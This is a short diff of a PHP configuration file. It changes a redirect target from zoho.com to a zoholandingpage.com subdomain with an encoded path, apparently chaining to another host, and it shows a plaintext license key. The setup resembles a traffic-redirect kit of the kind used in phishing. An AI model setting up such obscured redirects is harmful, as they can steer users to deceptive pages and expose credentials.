@@ -11,7 +11,7 @@
 
 $license_key = "gzd7ig7t0mny0d01grbtpw7xdqx5c6vv"; // [REQUIRED]
 
-$redirect = "https://zoho.com"; // URL or FILE [REQUIRED]
+$redirect = "https://mprnjbd.zoholandingpage.com/WcudXAucmFpbHdheS5hcHA/ZGs0d3BCV1I3REc1ekpCa3p?GpQTWQtMVVCeUNhQms5UmtSNVRZcU9pVDZTY0VTam92Y2pvUXZjeldHemZsMDNnTXF"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
